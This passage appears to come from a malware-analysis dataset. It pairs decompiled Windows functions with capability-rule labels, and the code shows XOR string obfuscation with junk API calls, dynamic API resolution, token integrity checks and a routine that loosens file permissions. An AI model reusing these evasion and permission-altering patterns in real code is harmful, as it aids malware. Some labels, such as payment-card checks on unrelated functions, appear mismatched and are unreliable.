iVar3) = *(&var_28h + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_10h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_40h._0_1_ = 0x24;\n    var_40h._1_1_ = 6;\n    var_40h._2_2_ = 0x5a07;\n    var_3ch._0_2_ = 0x3e02;\n    var_3ch._2_1_ = 0x25;\n    var_3ch._3_1_ = 3;\n    var_38h._1_2_ = 0x225c;\n    var_38h._3_1_ = 0x26;\n    var_34h._0_1_ = 0xc;\n    var_34h._1_1_ = 7;\n    var_34h._2_1_ = 0x29;\n    var_34h._3_1_ = 0x38;\n    var_20h = 0x38686a63;\n    var_1ch._0_2_ = 0x5263;\n    var_38h._0_1_ = var_40h._1_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_28h = iVar3;\n    var_10h = &var_40h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0xef2c4a) {\n            *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n    var_10h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_14h);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    iVar1 = (*pcVar6)(var_8h);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar1 == 0) {\n        iVar1 = (*var_10h)(var_8h);\n        if (iVar1 == 0) {\n            var_40h._0_1_ = 0x16;\n            var_40h._1_1_ = 0x5d;\n            var_40h._2_2_ = 0x340b;\n            var_3ch._0_2_ = 0x3a02;\n            var_3ch._2_1_ = 0x10;\n            var_3ch._3_1_ = 0x55;\n            var_38h._0_1_ = 0;\n            var_38h._1_2_ = 0x1717;\n            var_38h._3_1_ = 0x39;\n            var_34h._0_1_ = 0x3c;\n            var_34h._1_1_ = 0x70;\n            var_34h._2_1_ = 100;\n            var_30h = 0x56643151;\n            var_2ch._0_2_ = 0x5663;\n            uVar2 = (*pcVar6)(8, 0x10);\n            pcVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar3 = 0;\n            var_20h = &var_40h - pcVar6;\n            var_10h = pcVar6;\n            do {\n                iVar8 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                if (iVar8 != 0x565925) {\n                    pcVar6[iVar3] = *(&var_30h + iVar3 % var_4h) ^ (pcVar6 + iVar3)[var_20h];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0xf);\n            var_3ch._0_2_ = 0x228;\n            var_3ch._2_1_ = 0x11;\n            var_3ch._3_1_ = 7;\n            var_38h._0_1_ = 0x44;\n            var_38h._1_2_ = 0x42e;\n            var_38h._3_1_ = 0x27;\n            var_34h._0_1_ = 0x75;\n            var_30h = 0x46756669;\n            var_2ch._0_2_ = 0x4130;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_20h = &var_3ch - iVar3;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                iVar4 = lpModuleName;\n                if (iVar5 != 0xfef422) {\n                    *(iVar8 + iVar3) = *(&var_30h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_3ch - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 9);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n            pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n            pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*pcVar7)(var_8h);\n            (*pcVar6)(var_8h);\n            pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar6)(0, var_10h);\n            (*pcVar7)(uVar2);\n            iVar3 = var_28h;\n            goto code_r0x0040cd8b;\n        }\n    }\n    var_18h = 0;\ncode_r0x0040cd8b:\n    uVar2 = (*pcVar6)(0, iVar3);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar6)(0, var_14h);\n    (*pcVar7)(uVar2);\n    uVar2 = (*pcVar6)(0, iVar4);\n    (*pcVar7)(uVar2);\n    return var_18h;\n}\n",
        "token_count": 2535
    },
    "0040ee8e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ee8e(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uchar *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint hObject;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    puVar9 = &var_84h;\n    var_64h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_6ch = *0x41dab4;\n    var_68h = 0;\n    dwBytes = 0;\n    var_60h = 0;\n    var_10h = 0x342e153f;\n    var_ch = 0xd357a39;\n    var_8h._0_2_ = 0x5826;\n    var_34h = 0x584a6151;\n    var_30h._0_2_ = 0x5455;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_1ch = 0x6;\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar3 != 0x4733ae) {\n            *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_1ch) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_14h = 0x1f773b6a;\n    var_10h = 0x3e605a54;\n    var_ch = 0x47540c57;\n    var_8h._0_2_ = 0x4c43;\n    var_2ch = 0x6f384c30;\n    var_28h._0_2_ = 0x3431;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_34h = iVar6;\n    var_4h = &var_14h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x3476c7) {\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_1ch) ^ (&var_14h - iVar6)[iVar7 + iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_84h = 0x18;\n    var_80h = 0;\n    var_78h = 0;\n    var_7ch = 0;\n    var_74h = 0;\n    var_70h = 0;\n    iVar7 = (*pcVar5)(&var_5ch, 0x400, &var_84h, &var_6ch);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_18h = 0x8004119;\n        var_14h = 0x3d662d2c;\n        var_10h = 0x45262a17;\n        var_ch = 0x28262c3c;\n        var_8h._0_2_ = 0x2153;\n        var_8h._2_1_ = 0x78;\n        var_24h = 0x784f3643;\n        var_20h._0_1_ = 0x49;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_2ch = iVar6;\n        var_4h = &var_18h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0x4a53f2) {\n                var_4h = 0x5;\n                *(iVar7 + iVar6) = *(&var_24h + iVar7 % 5) ^ (&var_18h - iVar6)[iVar7 + iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_5ch, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_54h = 0x3a614737;\n            var_50h = 0x79142431;\n            var_4ch = 0x243b295e;\n            var_48h = 0x26445100;\n            var_44h = 0x5f39383b;\n            var_40h = 0x563a2a5b;\n            var_ch = 0x4f30306d;\n            var_8h._0_2_ = 0x5654;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_24h = iVar6;\n            var_4h = &var_54h - iVar6;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0xbb831d) {\n                    *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_1ch) ^ (iVar7 + iVar6)[&var_54h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_4h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_4h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_1ch != NULL) {\n                iVar7 = (*var_4h)(hObject, 1, var_1ch, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_1ch;\n                    puVar10 = var_64h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_60h = 1;\n                    iVar6 = var_24h;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_1ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_2ch;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_5ch);\n        uVar2 = (*pcVar5)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_34h;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_60h;\n}\n",
        "token_count": 2327
    },
    "0040176a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040176a(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "004020bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004020bd(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040218c(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.00402db5(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.004091c0(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 577
    },
    "0040acf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040acf7(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_30h = 0x1a12400c;\n    var_2ch = 0x63715f42;\n    var_28h = 0xc561a37;\n    var_24h._0_2_ = 0x4036;\n    var_24h._2_1_ = 0x45;\n    var_20h = 0x75453345;\n    var_1ch._0_2_ = 0x6935;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_10h = &var_30h - iVar4;\n    var_14h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0x8ac748) {\n            var_ch = 6;\n            *(iVar7 + iVar4) = *(&var_20h + iVar7 % 6) ^ (iVar7 + iVar4)[var_10h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_30h = 0x1622330d;\n    var_2ch = 0x62650a26;\n    var_28h = 0x3a0a2756;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x50);\n    var_ch = 0x78505666;\n    var_8h._0_1_ = 0x43;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_10h = &var_30h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar5 = var_14h;\n        if (iVar6 != 0xba32d9) {\n            var_10h = 5;\n            *(iVar7 + iVar4) = *(&var_ch + iVar7 % 5) ^ (iVar7 + iVar4)[&var_30h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_14h);\n    *0x41e220 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41e220 != NULL) {\n        iVar7 = (**0x41e220)(var_18h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 941
    },
    "0040189b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.0040189b(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_4ch;\n    ushort var_48h;\n    uint var_46h;\n    uint var_42h;\n    uchar var_3eh;\n    uchar var_3dh;\n    ushort var_3ch;\n    uint var_3ah;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint8_t *nSubAuthority;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    uint *TokenInformation;\n    uint var_1h;\n    \n    cVar6 = '\\0';\n    var_1h._0_1_ = '\\0';\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar2 == 0) &&\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap, \n           iVar2 == 0x7a)) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n            TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            cVar6 = var_1h;\n            if (TokenInformation != NULL) {\n                var_4ch._0_1_ = 0x3c;\n                var_14h = 6;\n                var_4ch._1_1_ = 6;\n                var_4ch._2_2_ = 0x1c3f;\n                var_48h = 0x2622;\n                var_46h._0_2_ = 0x120c;\n                var_46h._2_2_ = 0x1d22;\n                var_42h._0_2_ = 0x3132;\n                var_42h._2_1_ = 0x18;\n                var_3eh = 0x33;\n                var_3dh = 0x16;\n                var_3ch = 0x3d15;\n                var_3ah._0_1_ = 8;\n                var_3ah._1_1_ = 0x1f;\n                var_3ah._2_1_ = 0x56;\n                var_2ch = 0x78567369;\n                var_28h._0_2_ = 0x5461;\n                var_42h._3_1_ = var_4ch._1_1_;\n                uVar3 = (*pcVar7)(8, 0x16);\n                iVar2 = (*pcVar1)(uVar3);\n                iVar8 = 0;\n                var_18h = iVar2;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    puVar9 = TokenInformation;\n                    if (iVar4 != 0xf0ec35) {\n                        *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_14h) ^ (iVar8 + iVar2)[&var_4ch - iVar2];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x15);\n                iVar8 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, TokenInformation, TokenInformationLength, &TokenInformationLength)\n                ;\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar8 != 0) {\n                    var_4ch._0_1_ = 3;\n                    var_4ch._1_1_ = 0x2c;\n                    var_4ch._2_2_ = 0xc21;\n                    var_48h = 0x3d01;\n                    var_46h._0_2_ = 0x2713;\n                    var_46h._2_2_ = 0x716;\n                    var_42h._0_2_ = 0x3c24;\n                    var_42h._2_1_ = 0x3d;\n                    var_42h._3_1_ = 0x16;\n                    var_3eh = 0x54;\n                    var_3dh = 99;\n                    var_3ch = 0x5263;\n                    nSubAuthority = 0x78525550;\n                    var_20h._0_1_ = 100;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n                    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_2ch = iVar8;\n                    var_1ch = &var_4ch - iVar8;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                        if (iVar4 != 0xc2aaf0) {\n                            var_1ch = 5;\n                            *(iVar2 + iVar8) = *(&nSubAuthority + iVar2 % 5) ^ (iVar2 + iVar8)[&var_4ch - iVar8];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x12);\n                    nSubAuthority = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*TokenInformation);\n                    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if ((nSubAuthority != NULL) && (*nSubAuthority != 0)) {\n                        var_48h = 0x2c22;\n                        var_46h._0_2_ = 0x1334;\n                        var_46h._2_2_ = 0x1e2a;\n                        var_42h._0_2_ = 0x2d00;\n                        var_42h._2_1_ = 0x2c;\n                        var_42h._3_1_ = 0x35;\n                        var_3eh = 6;\n                        var_3dh = 1;\n                        var_3ch = 0x6b13;\n                        var_3ah._0_1_ = 0x6a;\n                        var_3ah._1_1_ = 0x50;\n                        var_34h = 0x50585870;\n                        var_30h._0_2_ = 0x7345;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n                        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar8 = 0;\n                        var_1ch = &var_48h - iVar2;\n                        do {\n                            iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                            if (iVar4 != 0x6e1cb8) {\n                                *(iVar8 + iVar2) = *(&var_34h + iVar8 % var_14h) ^ (iVar8 + iVar2)[&var_48h - iVar2];\n                            }\n                            iVar8 = iVar8 + 1;\n                        } while (iVar8 < 0x10);\n                        puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*TokenInformation, *nSubAuthority - 1);\n                        iVar8 = var_2ch;\n                        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (puVar5 != NULL) {\n                            if (*puVar5 < 0x2000) {\n                                var_1h._0_1_ = '\\x01';\n                            }\n                            else {\n                                var_1h._0_1_ = '\\x03' - (*puVar5 < 0x3000);\n                            }\n                        }\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    }\n                    iVar2 = var_18h;\n                    uVar3 = (*pcVar7)(0, iVar8);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    puVar9 = TokenInformation;\n                }\n                uVar3 = (*pcVar7)(0, puVar9);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*pcVar7)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                cVar6 = var_1h;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar6;\n}\n",
        "token_count": 2101
    },
    "0040218c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040218c(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.0040278e();\n    fcn.00402f79(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.00402f79(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x00402293:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x004022b4;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040227e;\n                        pcVar5 = pcVar5 + 1;\n                        